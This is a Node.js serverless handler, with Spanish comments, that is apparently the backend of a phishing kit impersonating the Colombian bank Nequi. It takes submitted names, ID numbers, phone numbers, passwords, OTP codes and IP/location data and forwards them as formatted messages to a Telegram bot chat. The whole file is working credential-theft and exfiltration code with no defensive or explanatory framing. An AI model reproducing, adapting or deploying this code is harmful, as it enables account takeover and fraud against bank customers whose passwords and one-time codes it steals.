const axios = require('axios');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

async function parseBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', (chunk) => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                resolve(JSON.parse(body));
            } catch (error) {
                reject(new Error('Invalid JSON input'));
            }
        });
    });
}

module.exports = async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Procesar el cuerpo de la solicitud
        const body = await parseBody(req);

        const {
            documentNumber,
            fullName,
            username,
            password,
            userIP,
            city,
            country,
            otpCode,
            dynamicCode,
        } = body;

        if (!documentNumber || !fullName) {
            return res.status(400).json({ error: 'Datos incompletos: documento o nombre faltante' });
        }

        let message;

        if (otpCode) {
            message = `
🤠Nequi_OTP🤠
🆔Nombres: ${fullName}
🪪Cedula: ${documentNumber}
#️⃣Número: ${username || 'No proporcionado'}
🔐Clave: ${password || 'No proporcionada'}
⭐️OTP: ${otpCode}
🌏IP: ${userIP || 'Desconocida'}
🇨🇴Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
`.trim();
        } else {
            message = `
👤Nequi_Meta_Infinito👤
🆔Nombres: ${fullName}
🪪Cédula: ${documentNumber}
#️⃣Número: ${username}
🔐Clave: ${password}
🌏IP: ${userIP || 'Desconocida'}
🇨🇴Ciudad: ${city || 'Desconocida'}, País: ${country || 'Desconocido'}
`.trim();
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
            { chat_id: CHAT_ID, text: message }
        );

        res.json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al procesar la solicitud:', error.message);
        res.status(500).json({
            error: 'Error al enviar mensaje a Telegram',
            details: error.message,
        });
    }
};
